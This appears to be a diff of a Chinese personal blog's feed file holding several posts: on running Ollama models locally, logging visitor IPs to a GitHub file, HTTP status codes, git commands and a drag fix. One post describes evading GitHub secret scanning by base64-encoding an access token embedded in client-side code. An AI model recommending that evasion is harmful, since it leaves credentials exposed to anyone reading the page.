+        <content type="html"><![CDATA[<style>.大纲 {    letter-spacing: 0.5px; /* 调整字间距，适当增加或减少 */    line-height: 0.8; /* 调整行间距，适当增加或减少 */    margin-bottom: 1px; /* 调整列表项之间的间距 */}</style><span class='大纲'><ol><li><p><a href="#%E4%B8%8B%E8%BD%BDai%E5%88%B0%E6%9C%AC%E5%9C%B0">下载AI到本地</a></p><ul><li><a href="#%E9%80%9A%E8%BF%87ollama%E4%B8%8B%E8%BD%BD">通过ollama下载</a></li><li><a href="#%E5%88%B0huggingface%E4%B8%8A%E4%B8%8B%E8%BD%BDguff%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%A8%A1%E5%9E%8B">到huggingface上下载guff格式的模型</a></li></ul></li><li><p><a href="#%E6%9C%AC%E5%9C%B0AI%E7%9A%84%E9%85%8D%E7%BD%AE">本地AI的配置</a></p><ul><li><a href="#GUI%E9%85%8D%E7%BD%AE">GUI配置</a></li><li><a href="#modelfile%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE">modelfile文件配置</a></li></ul></li><li><p><a href="#ai%E6%9C%8D%E5%8A%A1%E5%BC%80%E6%94%BE">AI服务开放</a></p><ul><li><a href="#ollama%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3">ollama开放端口</a></li><li><a href="#%E4%BA%92%E8%81%94%E7%BD%91%E8%AE%BF%E9%97%AE">互联网访问</a></li><li><a href="#%E8%AE%BF%E9%97%AE%E8%AF%B7%E6%B1%82">访问请求</a></li></ul></li><li><p><a href="#ai%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%BE%AE%E8%B0%83">AI模型的微调</a></p><ul><li><a href="#%E8%AE%AD%E7%BB%83%E4%B8%8E%E6%8E%A8%E7%90%86">训练与推理</a></li><li><a href="#lora%E6%A8%A1%E5%9E%8B%E6%B7%B7%E5%90%88">lora模型混合</a></li></ul></li></ol></span><h2 id="下载ai到本地"><a href="#下载ai到本地" class="headerlink" title="下载ai到本地"></a>下载ai到本地</h2><p>‘为什么要下载ai到本地’</p><ol><li>本地运行ai可以更快的响应用户的请求，减少响应延迟。</li><li>本地运行ai可以更方便的调试和修改。</li><li>本地运行ai的请求内容和训练数据都是保存在本地的。</li></ol><h3 id="通过ollama下载"><a href="#通过ollama下载" class="headerlink" title="通过ollama下载"></a>通过ollama下载</h3><p>ollama是旨在简化大型语言模型本地部署和运行过程的工具。</p><p>下载安装ollama</p><p><a href="https://ollama.com/search">ollama都有哪些模型</a></p><p>我在写这篇blog的时候，ollama已经发布了llama3.3的下载链接</p><p>打开终端，执行</p><pre><code class="shell">ollama run llama3.3 #  举例，也许你想run别的</code></pre><p>ollama就会自动下载了</p><p><a href="https://blog.csdn.net/My_wife_QBL/article/details/139094759">ollama其他命令</a></p><p>插一嘴，我因为不想自己微调，下载了3.2-chinese，结果效果并不好，不是说中文回答不好，也许是因为微调过拟合而不能很好地根据模型文件生成自定义模型了</p><p>又注，微调很容易过拟合而失去通用能力</p><h3 id="到huggingface上下载guff格式的模型"><a href="#到huggingface上下载guff格式的模型" class="headerlink" title="到huggingface上下载guff格式的模型"></a>到huggingface上下载guff格式的模型</h3><p>ollama可以接受此类模型生成自己的模型文件，但同时，通过ollama下载的模型可能无法直接使用，所以ollama虽然方便，但如果之后有微调需要，还是从huggingface上下载好。</p><h2 id="本地AI的配置"><a href="#本地AI的配置" class="headerlink" title="本地AI的配置"></a>本地AI的配置</h2><h3 id="GUI配置"><a href="#GUI配置" class="headerlink" title="GUI配置"></a>GUI配置</h3><p>命令行和gui各有优劣吧。</p><p>命令行很带感有木有。</p><p>但是图形化界面很方便添加后续功能。</p><p>gui没有附带在ollama中，需要单独搜索下载安装</p><p>ollama-gui画面简洁，且脚本开源，非常推荐。不过也许你懒得自己写功能，那么还有其他功能已经完备的适用于ollama的软件。</p><p>或者你可以试试我的网页版，<a href="/AI/localAi/">传送门</a><br>前提是你有一个本地ai，并了解过了有关<a href="#ollama%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3">端口服务</a></p><h3 id="modelfile文件配置"><a href="#modelfile文件配置" class="headerlink" title="modelfile文件配置"></a>modelfile文件配置</h3><p>详细内容直接移步：<a href="https://blog.csdn.net/Chaos_Happy/article/details/138276172">https://blog.csdn.net/Chaos_Happy/article/details/138276172</a></p><p><code>ollama create &lt;新模型名&gt; -f &lt;modelfile文件路径&gt;</code></p><p>modelfile文件格式：</p><p>FROM (必需的)定义使用的基模型</p><p>PARAMETER(参数)设置Ollama运行模型的参数</p><p>TEMPLATE(提示词模板)于发送给模型的完整提示模板<br>&#x2F;&#x2F;不是放提示词的意思，使用go语言编写，是正经模板</p><p>SYSTEM指定将在模板中设置的系统消息</p><p>ADAPTER定义适用于模型的（Q）LoRA适配器</p><p>LICENSESpecifies the legal license.</p><p>MESSAGE指定消息历史<br>&#x2F;&#x2F;消息历史能潜移默化地改变模型的行为，如果因为ai始终不做出满意的回答而气急败坏，不妨从这里入手，给它做个示范，也许效果不错</p><h2 id="ai服务开放"><a href="#ai服务开放" class="headerlink" title="ai服务开放"></a>ai服务开放</h2><h3 id="ollama开放端口"><a href="#ollama开放端口" class="headerlink" title="ollama开放端口"></a>ollama开放端口</h3><p>ollama默认自启动，如果没有可以手动在终端输入命令</p><pre><code class="shell">ollama serve</code></pre><p>成功了它会告诉你开放了你的哪个端口，点击链接或者直接在互联网访问<a href="http://localhost/">http://localhost</a>:<port>，就可以看到ollama is running的字样，表示服务正在启动。</p><p>在终端可以看到ollama的日志，访客信息，请求信息，请求状态等。</p><p>但到这一步，ai服务仅仅只能被局域网内的主机访问，因为你的ip被限制在了内网。</p><h3 id="互联网访问"><a href="#互联网访问" class="headerlink" title="互联网访问"></a>互联网访问</h3><p>想要让ai服务在互联网上被访问，途径之一是将此端口投射到公网。</p><p>这一过程被称为内网穿透，你需要通过Ngix或者Cpolar等服务申请隧道，然后拥有一个暂时的域名，将你开放的端口投射到此域名上，然而我尝试的效果并不好，成功连接很不容易。</p><p>如果你资金充足，可以购买一个公网ip，甚至将ai上传到云服务器上，这样就可以让所有人24小时在公网上访问了。</p><p>所以你明白了什么叫梦想版。</p><p>抛开资金细节，我们已经拥有了一个域名，这个域名不是用来打开的，我们上传端口后，就获得了一个可以访问的api</p><p>api格式：<br>廉政版：<code>http://127.0.0.1:端口号/api/chat</code><br>小康版：<code>http://你的域名/api/chat</code></p><p>127.0.0.1就是你自己，仅供自己访问的意思，可以换成内网ip，就能让局域网内访问</p><p>如果你是小康版，且没有做任何限制，那么这个api是可以被任意访问的，访问的这个过程就是对api做出请求。</p><h3 id="访问请求"><a href="#访问请求" class="headerlink" title="访问请求"></a>访问请求</h3><p>我们假设我们奔小康了。</p><p>给出访问请求的格式方便理解请求这一过程（只拿js举例）：</p><pre><code class="javascript"> const response = await fetch(`$&#123;API_URL&#125;/api/chat`, &#123;//替换为你自己的api地址                method: &#39;POST&#39;,//请求类型一般为post                headers: &#123;//请求头                    &#39;Content-Type&#39;: &#39;application/json&#39;,//请求体格式为json                &#125;,                body: JSON.stringify(&#123;//请求体                    model: &#39;cgl&#39;, // 替换为你所选择的模型名称                    messages: [message],//用户输入的消息                    stream: true,//是否持续返回结果                &#125;),            &#125;);</code></pre><p>这个请求会返回包含ai回复的json数据，其中就包括回复内容</p><p>stream为true，表示请求响应将持续不断，直到ai结束对话。如果请求需要token，那么每个token相当于将近一个汉字或一个词，所以如果请求过长，可能会导致响应延迟。<br><span style='color:grey;'><br>很多ai模型厂商如openAi对token做限制，现在注册成为普通用户，只能使用gpt-4o-mini，每分钟只能做3次对话，超过请求就会被拒绝，非常不舒服。<br></span><br>那，关于ai的流式返回和结果处理，我新开一篇写。</p><p>如果是非流式的api返回，那应当简单的多，正如同我当下利用的fittenCode的api，只需要等到接收到结果并呈现给用户，不过是如果返回的内容多的话，返回的时间会长一些。</p><p>我们继续往下说，此时梦想版的我们已经完成了api的访问和获得回复，我们还需要把请求这一过程图形化，即创建一个合适的前端页面，让用户可以输入消息，选择模型，点击发送，然后获取ai的回复。</p><p>这里没有什么可说的，重点是保存对话的历史记录，在请求时一并发送，这样ai就好像理解了上下文。</p><p>不得不称赞fittenCode的api，反应速度很快，每次返回都没什么延迟，就算对话历史内容越堆越多，几乎看不出差别，反观我本地的模型，如果提示词长了些，每次开始对话都需要很长一段时间加载，如果隔一段时间没对话，同样也要加载。</p><p>我想这跟ai模型的大小和服务器性能都有关系。</p><h2 id="Ai模型的微调"><a href="#Ai模型的微调" class="headerlink" title="Ai模型的微调"></a>Ai模型的微调</h2><p>到这里并不是终点，ai还仅仅只是原有的模型，我们需要根据自己的需求调整它。</p><h3 id="训练与推理"><a href="#训练与推理" class="headerlink" title="训练与推理"></a>训练与推理</h3><h3 id="lora模型混合"><a href="#lora模型混合" class="headerlink" title="lora模型混合"></a>lora模型混合</h3><p>没有尝试的东西是没有办法继续往下写的，我目前还没有尝试的条件。</p><p>所以——</p><p>未完待续……</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> AI </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> AI </tag>
+            
+            <tag> api </tag>
+            
+            <tag> 一篇流 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>github绕过私密扫描</title>
+      <link href="/2024/12/18/github%E7%BB%95%E8%BF%87%E7%A7%81%E5%AF%86%E6%89%AB%E6%8F%8F/"/>
+      <url>/2024/12/18/github%E7%BB%95%E8%BF%87%E7%A7%81%E5%AF%86%E6%89%AB%E6%8F%8F/</url>
+      
+        <content type="html"><![CDATA[<p>真好，一个东西能拆成好几篇写。</p><p>有关ip存储，发现本地正常，但推送到github上后，发现执行脚本总是返回401，401说明用户认证存在问题，打开github查看令牌发现令牌过期了。</p><p>但是令牌并没有到过期期限，我重新设置生成了令牌，重复操作，结果依旧是401，打开github再看，又过期了。</p><p>查看官方说明，原来把token推到公共库会自动过期。</p><p>github私密扫描这一功能大概不是面向用户的，也就是说用户无法决定它启用不启用，它是始终启用的，我们没有办法组织令牌失效。</p><p>那也不是没有办法使用token了，比如可以从上传这一步入手，github只检测明文，我们把token加密后上传它是检测不出来的，这样就不会强制过期了。</p><h3 id="附base64加密："><a href="#附base64加密：" class="headerlink" title="附base64加密："></a>附base64加密：</h3><pre><code class="shell">echo -n &quot;your_token&quot; | base64</code></pre><p>或者用在线工具，这里推荐一个工具包大全:<a href="https://www.toolhelper.cn/">https://www.toolhelper.cn/</a><br>加密好的放入文件中上传，在网页执行时解密</p><h3 id="解密："><a href="#解密：" class="headerlink" title="解密："></a>解密：</h3><pre><code class="javascript">    const base64EncodedString = &#39;&#39;;//你的base64加密后的字符串    const decodedString = atob(base64EncodedString);//这里把得到的结果放入请求就可以了</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> github </tag>
+            
+            <tag> 日志 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Http返回状态码分析与解决</title>
+      <link href="/2024/12/18/Http%E8%BF%94%E5%9B%9E%E7%8A%B6%E6%80%81%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%86%B3/"/>
+      <url>/2024/12/18/Http%E8%BF%94%E5%9B%9E%E7%8A%B6%E6%80%81%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%86%B3/</url>
+      
+        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>HTTP状态码是服务器对客户端HTTP请求的响应。它们由三位数字组成，第一位数字定义了响应的类型：</p><pre><code>1xx：指示信息 - 请求已接收，继续处理。2xx：成功 - 请求已成功被服务器接收、理解、并接受。3xx：重定向 - 需要后续操作才能完成请求。4xx：客户端错误 - 请求包含语法错误或无法完成请求。5xx：服务器错误 - 服务器在处理请求的过程中发生了错误。</code></pre><h3 id="常见返回"><a href="#常见返回" class="headerlink" title="常见返回"></a>常见返回</h3><p>200  OK   请求成功</p><p>400  Bad Request   错误的请求 检查请求格式内容是否正确<br>401  Unauthorized   未授权 检查Authorization头是否正确<br>403  Forbidden   禁止访问，通常是没有权限<br>404  Not Found   未找到，通常是请求的资源不存在，检查路径是否正确</p><p>504  Gateway Timeout   网关超时</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>201  Created   已创建<br>202  Accepted   已接受<br>204  No Content   无内容</p><p>301  Moved Permanently   永久重定向<br>302  Found   临时重定向<br>304  Not Modified   目标数据未修改，不需要再次传输</p><p>405  Method Not Allowed   方法不允许，检查请求头方法类型<br>406  Not Acceptable   不可接受，通常是请求希望接收的资源格式不存在。<br>409  Conflict   冲突，通常是请求的资源与服务器状态冲突，比如资源已存在<br>415  Unsupported Media Type   不支持的媒体类型，通常是请求发送的资源格式服务器不支持。<br>422  Unprocessable Entity   无法处理的实体，通常是请求的资源格式正确，但语义错误</p><p>500  Internal Server Error   服务器内部错误，通常是服务器发生了意外错误。<br>502  Bad Gateway   网关错误，通常发生在后端服务器在处理请求时发生错误，或者根本没有响应。<br>503  Service Unavailable   服务不可用，通常是服务器暂时无法处理请求，可以尝试再次请求。<br>505  HTTP Version Not Supported   HTTP版本不支持，检查请求头中的HTTP版本是否正确。</p><p><span style='color:grey;font-size:smaller'>摘自网络，仅供参考</span></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>有关ip数据存储的全程回顾</title>
+      <link href="/2024/12/17/%E6%9C%89%E5%85%B3ip%E8%BF%BD%E8%B8%AA%E5%AD%98%E5%82%A8%E7%9A%84%E5%85%A8%E7%A8%8B%E5%9B%9E%E9%A1%BE/"/>
+      <url>/2024/12/17/%E6%9C%89%E5%85%B3ip%E8%BF%BD%E8%B8%AA%E5%AD%98%E5%82%A8%E7%9A%84%E5%85%A8%E7%A8%8B%E5%9B%9E%E9%A1%BE/</url>
+      
+        <content type="html"><![CDATA[<p>这个东西思路简单，但实现也是耗费了一整天时间，毕竟你不知道哪里问题会突然跳出来，做完眼都花了。</p><p>我想从大概三个方面总结一下：存储、请求和实现流程。先说思路，再说过程。</p><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><p>存储一直是个很麻烦的事情，先前照片存储就折腾了很久，又是图床又是加速，最终效果也不好（当然，你既然想要啥都免费了，就不能又要又要的）。</p><p>而这次不同先前，不光要存储和读取，还要能修改写入，不然得到了ip也没有用，所以静态存储已经不能满足我们的需要了。</p><p>我始终没有找到免费的国内云端数据库，所以用的还是github——哎？等等，不是静态存储已经不能……</p><p>没错，我们要用github存储和读取，并在网页客户端频繁更改。</p><p>新建一个仓库，放入一个你要存储的空文件，在个人页面生成一个拥有修改此文件权限的token。（我英语不好，之前以为token全局生效，为了避免其他仓库数据泄露风险选择了用另一个邮箱注册了新号，实则不需要）</p><p>接下来就是在网页端实现对ip的获取和存储。</p><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p>以下是简化的请求格式，仅供参考</p><h4 id="请求ip"><a href="#请求ip" class="headerlink" title="请求ip"></a>请求ip</h4><pre><code class="js">    const ipAddresses = &#39;&#39;;//接入获取ip的api    try &#123;            const response = await fetch(ipAddress);            const data = await response.json();            return data.ip;         &#125;    </code></pre><p>在直接存储之前，我们还有读取文件的过程，我们还需要读取已有的数据并检验此ip是否已经被存储了，我们不重复存储数据才能实现进站计数效果，我认为这个效果要比之前那个刷新一次就记一次数的插件要好。</p><h4 id="请求读取"><a href="#请求读取" class="headerlink" title="请求读取"></a>请求读取</h4><pre><code class="js">    const response = await fetch(&#39;https://raw.githubusercontent.com/用户名/库名/&lt;文件&gt; &#39;);   //原生数据地址</code></pre><p>‘这里为啥不用cdn加速了？’<br>因为我发现cdn加速获取不到最新数据，提交后会覆盖原有数据，使数据不准确<br>‘那这个get不会很慢吗？’<br>而且不挂梯子很容易失败，这就没有办法了，没有找到免费的国内数据库</p><h4 id="请求存储"><a href="#请求存储" class="headerlink" title="请求存储"></a>请求存储</h4><pre><code class="js">    const updateResponse = await fetch(&#39;https://api.github.com/repos/用户名/库名/&lt;文件&gt; &#39;, &#123;        method: &#39;PUT&#39;,//put请求常用于文件更改或替换        headers: &#123;            &#39;Authorization&#39;: `&lt;你生成的token&gt; `,//当然这里是有很大的泄露风险的，或者说几乎是赤裸的，所以不要用作重要的数据，并且这里最好先加密再解密以绕过扫描，或者分成两段字符串，我猜的，感兴趣可以试试            &#39;Content-Type&#39;: &#39;application/json&#39;        &#125;,        body: JSON.stringify(&#123;            message: &#39;&#39;,//提交注释信息            content: //编码后的存储数据             sha: //文件sha值，确保一致        &#125;)    &#125;);</code></pre><p><a href="https://api.github.com/repos/%E7%94%A8%E6%88%B7%E5%90%8D/%E5%BA%93%E5%90%8D/">https://api.github.com/repos/用户名/库名/</a>&lt;文件&gt;是github提供的api，更多详见官方文档</p><p>其他逻辑不再详述，自此我们假设脚本已能成功获取存储ip了。</p><h3 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h3><p>这有什么可说的，不就</p><p>把获取和存储ip的脚本放到网页上</p><p>就行了吗？</p><p>是这样的，都多余了。</p><p>不过有几个值得记下来的地方。</p><p>网页在解析到<code>&lt;script&gt;</code>时就会自动开始编译和执行脚本，但是我们的js脚本请求很慢，尤其还有个get原生国外网址，会导致页面加载不出来，解决的办法就是把脚本放到页面渲染完毕之后再执行。</p><p>所幸刚好有这样便捷的方法</p><pre><code class="html">&lt;script defer&gt;&lt;/script&gt;</code></pre><p>顺便，把脚本拿到网页md文件的外面</p><pre><code class="html">&lt;script src=&quot;你的/脚本/路径/目标脚本.js&quot; defer&gt;&lt;/script&gt;</code></pre><p>如果放在模板文件里，就能让所有页面搭载上这个脚本了。</p><h3 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h3><blockquote><p>文件上传时遇到了 - Push cannot contain secrets</p></blockquote><p>这是github的私密扫描，不允许上传token等敏感信息，点击它返回的链接选择<code>我愿意泄密</code>就可以了，当然确保确实不会泄露重要信息</p><blockquote><p>同一ip连续的get全都是404因而被github禁止访问</p></blockquote><p>get加上token允许访问的次数会多一些<br>我遇到这个问题是因为调试代码，一直失败，没办法的，调试好了就没有了。</p><blockquote><p>脚本加载得很慢，不挂梯子成功率很低</p></blockquote><p>我在想。</p><blockquote><p>怎么调试代码</p></blockquote><p>浏览器的控制台可以查看日志<br><a href="../../18/Http%E8%BF%94%E5%9B%9E%E7%8A%B6%E6%80%81%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%86%B3">根据返回的状态码判断问题</a></p><blockquote><p>生成的token到期</p></blockquote><p>重新生成token并调整token使用期限<br>如果是预期意外的过期，有可能是把token上传到了公开库，<a href="../../18/github%E7%BB%95%E8%BF%87%E7%A7%81%E5%AF%86%E6%89%AB%E6%8F%8F">寻求方法绕过</a></p><p>到此为止吧</p><blockquote><p>追加</p></blockquote><p>现在会有时候返回422，如果一直返回倒也不奇怪，但是有时候返回，有时候又正常，这我就不明白了，这跟浏览器读取我的请求有关系吧。</p><p>如果返回429，说明限制了访问频率限制。18号追加</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 后端 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 后端 </tag>
+            
+            <tag> 日志 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>github拉取与推送等操作</title>
+      <link href="/2024/12/17/github%E6%8B%89%E5%8F%96%E4%B8%8E%E6%8E%A8%E9%80%81%E6%93%8D%E4%BD%9C/"/>
+      <url>/2024/12/17/github%E6%8B%89%E5%8F%96%E4%B8%8E%E6%8E%A8%E9%80%81%E6%93%8D%E4%BD%9C/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Github新建仓库五步指令"><a href="#Github新建仓库五步指令" class="headerlink" title="Github新建仓库五步指令"></a>Github新建仓库五步指令</h3><pre><code class="bash"># 第一步：创建新的仓库git init &lt;仓库名称&gt;# 第二步：添加文件到暂存区git add .# 第三步：提交文件到本地仓库git commit -m &quot;首次提交&quot;# 第四步：将本地仓库关联到远程仓库git remote add origin &lt;远程仓库地址&gt;# 第五步：推送代码到远程仓库git push -u origin master</code></pre><h3 id="关于add"><a href="#关于add" class="headerlink" title="关于add"></a>关于add</h3><pre><code class="bash"># 添加所有文件到暂存区git add .# 添加指定文件到暂存区git add 文件名# 添加所有文件到暂存区并提交git commit -a -m &quot;提交说明&quot;# 添加特定类型文件到暂存区git add *.txt# 使用交互式命令添加文件到暂存区git add -p</code></pre><h3 id="关于克隆"><a href="#关于克隆" class="headerlink" title="关于克隆"></a>关于克隆</h3><pre><code class="bash"># 克隆远程仓库到本地git clone &lt;远程仓库地址&gt;# 克隆指定分支git clone -b &lt;分支名&gt; &lt;远程仓库地址&gt;# 克隆到指定目录git clone &lt;远程仓库地址&gt; &lt;本地目录&gt;# 浅克隆git clone --depth=1 &lt;远程仓库地址&gt;# 克隆指定版本git clone -b &lt;分支名&gt; &lt;远程仓库地址&gt; --single-branch</code></pre><h3 id="关于pull"><a href="#关于pull" class="headerlink" title="关于pull"></a>关于pull</h3><pre><code class="bash"># 拉取远程仓库代码到本地git pull# 拉取远程仓库代码到本地并合并git pull --rebase</code></pre><h3 id="关于push"><a href="#关于push" class="headerlink" title="关于push"></a>关于push</h3><pre><code class="bash"># 推送本地代码到远程仓库    git push origin master# 推送本地代码到远程仓库并覆盖远程仓库代码git push -f origin master# 推送本地分支到远程仓库git push origin &lt;分支名&gt;# 推送本地分支到远程仓库并覆盖远程仓库代码git push -f origin &lt;分支名&gt;</code></pre><h3 id="关于分支"><a href="#关于分支" class="headerlink" title="关于分支"></a>关于分支</h3><pre><code class="bash"># 创建分支git branch &lt;分支名&gt;# 切换分支git checkout &lt;分支名&gt;# 合并分支  # 合并指定分支到当前分支git merge &lt;分支名&gt;# 合并指定分支到指定分支git merge &lt;分支名&gt; &lt;目标分支名&gt;# 删除分支git branch -d &lt;分支名&gt;# 查看分支git branch# 查看所有分支git branch -a# 新建分支并切换到该分支git checkout -b &lt;分支名&gt;# 推送分支到远程仓库git push origin &lt;分支名&gt;# 拉取远程分支到本地git pull origin &lt;分支名&gt;</code></pre><h3 id="关于token"><a href="#关于token" class="headerlink" title="关于token"></a>关于token</h3><pre><code class="bash"># 使用token推送git push https://&lt;token&gt;@github.com/username/repository.git# 缓存token（无需每次推送输入）git config --global credential.helper cache# 取消缓存tokengit config --global --unset credential.helper</code></pre><h3 id="js发送请求-仅作为模板-："><a href="#js发送请求-仅作为模板-：" class="headerlink" title="js发送请求(仅作为模板)："></a>js发送请求(仅作为模板)：</h3><h4 id="读取数据："><a href="#读取数据：" class="headerlink" title="读取数据："></a>读取数据：</h4><pre><code class="javascript">const repoOwner = &#39;username&#39;; // 仓库拥有者const repoName = &#39;repository-name&#39;; // 仓库名称const url = `https://api.github.com/repos/$&#123;repoOwner&#125;/$&#123;repoName&#125;`;fetch(url)    .then(response =&gt; &#123;        if (!response.ok) &#123;            throw new Error(&#39;网络响应不正常&#39;);        &#125;        return response.json();    &#125;)    .then(data =&gt; &#123;        console.log(data); // 在控制台输出仓库信息    &#125;)    .catch(error =&gt; &#123;        console.error(&#39;获取数据时出现错误:&#39;, error);    &#125;);</code></pre><h4 id="更改数据："><a href="#更改数据：" class="headerlink" title="更改数据："></a>更改数据：</h4><pre><code class="javascript">const token = &#39;your_access_token&#39;; // 你的GitHub访问令牌const repoOwner = &#39;username&#39;; // 仓库拥有者const repoName = &#39;repository-name&#39;; // 仓库名称const filePath = &#39;path/to/newfile.txt&#39;; // 要创建的文件路径const content = btoa(&#39;Hello, World!&#39;); // 文件内容，使用base64编码const url = `https://api.github.com/repos/$&#123;repoOwner&#125;/$&#123;repoName&#125;/contents/$&#123;filePath&#125;`;fetch(url, &#123;    method: &#39;PUT&#39;,    headers: &#123;        &#39;Authorization&#39;: `token $&#123;token&#125;`,        &#39;Accept&#39;: &#39;application/vnd.github.v3+json&#39;,        &#39;Content-Type&#39;: &#39;application/json&#39;    &#125;,    body: JSON.stringify(&#123;        message: &#39;创建新文件&#39;,        content: content,        sha: &#39;&#39;, // 如果文件已经存在，提供文件的SHA值以避免覆盖    &#125;)&#125;)    .then(response =&gt; response.json())    .then(data =&gt; &#123;        console.log(data); // 在控制台输出结果    &#125;)    .catch(error =&gt; &#123;        console.error(&#39;发送请求时出现错误:&#39;, error);    &#125;);</code></pre><p>仅供参考，使用前先验证以免出错</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 后端 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+            <tag> github </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（9）</title>
+      <link href="/2024/12/17/%E6%97%A5%E5%BF%97%EF%BC%889%EF%BC%89/"/>
+      <url>/2024/12/17/%E6%97%A5%E5%BF%97%EF%BC%889%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h2 id="更改"><a href="#更改" class="headerlink" title="更改"></a>更改</h2><p>音乐插件在移动端的拖动问题修复</p><blockquote><p>问题出在没有绑定touch事件<br>附修改后插件拖动代码</p></blockquote><pre><code class="javascript">var $DOC = $(document);// 拖动逻辑的封装function handleDrag(e) &#123;    e.preventDefault();    e.stopPropagation();    // 阻止文本选中    $DOC.bind(&quot;selectstart&quot;, function () &#123;        return false;    &#125;);    var $moveTarget = $(&#39;#musicMouseDrag&#39;);    $moveTarget.css(&#39;border&#39;, &#39;1px dashed grey&#39;);    // 计算初始坐标偏移量    var pageX = e.type === &#39;touchstart&#39; ? e.originalEvent.touches[0].pageX : e.pageX;    var pageY = e.type === &#39;touchstart&#39; ? e.originalEvent.touches[0].pageY : e.pageY;    var div_x = pageX - $moveTarget.offset().left;    var div_y = pageY - $moveTarget.offset().top;    // 绑定移动事件    $DOC.on(&#39;mousemove touchmove&#39;, function (e) &#123;        e.preventDefault();//阻止默认事件        e.stopPropagation();//阻止事件冒泡        // 更新坐标        pageX = e.type === &#39;touchmove&#39; ? e.originalEvent.touches[0].pageX : e.pageX;        pageY = e.type === &#39;touchmove&#39; ? e.originalEvent.touches[0].pageY : e.pageY;        var targetX = pageX - div_x;        var targetY = pageY - div_y;        // 限制在屏幕内        targetX = Math.max(0, Math.min(targetX, window.innerWidth - $moveTarget.outerWidth()));        targetY = Math.max(0, Math.min(targetY, window.innerHeight - $moveTarget.outerHeight()));        $moveTarget.css(&#123;&#39;left&#39;: targetX + &#39;px&#39;, &#39;top&#39;: targetY + &#39;px&#39;, &#39;bottom&#39;: &#39;auto&#39;, &#39;right&#39;: &#39;auto&#39;&#125;);    &#125;).on(&#39;mouseup touchend&#39;, function () &#123;        $DOC.unbind(&quot;selectstart&quot;);        $DOC.off(&#39;mousemove touchmove&#39;);        $DOC.off(&#39;mouseup touchend&#39;);        $moveTarget.css(&#39;border&#39;, &#39;none&#39;);    &#125;);&#125;// 通过设备判断绑定不同拖动事件if (!(&#39;ontouchstart&#39; in window)) &#123;    $(&#39;.musicDragArea&#39;).on(&#39;mousedown&#39;, handleDrag);&#125; else &#123;    $(&#39;.musicDragArea&#39;).on(&#39;touchstart&#39;, handleDrag);&#125;</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（8）</title>
+      <link href="/2024/12/16/%E6%97%A5%E5%BF%97%EF%BC%888%EF%BC%89/"/>
+      <url>/2024/12/16/%E6%97%A5%E5%BF%97%EF%BC%888%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>更改</p></blockquote><p><a href="/AI/">Ai</a>现在可以交流了<br>&emsp;<span style='font-size:smaller;'>AI借用了fittenCode的api。</span></p><p>添加了上下文联系功能<br>更改了消息css<br>修复了换行符无法在页面上展示的问题</p><blockquote><p>此问题源于html界面无法直接展示换行符，因此需要将换行符替换为html标签。<br> 但如果直接替换为&lt;br&gt;又会只展示字符，这里用的方法是更改css样式，添加white-space: pre-wrap; &#x2F;* 允许换行 *&#x2F;</p></blockquote><p>更改使允许英文对话</p><blockquote></blockquote><p>有关逐字展示的功能，由于等待时间都在请求和返回上，猜想动态展示并不能让ai回复更快些，因此没有更改</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+            <tag> Ai </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（7）</title>
+      <link href="/2024/12/15/%E6%97%A5%E5%BF%97%EF%BC%887%EF%BC%89/"/>
+      <url>/2024/12/15/%E6%97%A5%E5%BF%97%EF%BC%887%EF%BC%89/</url>
+      
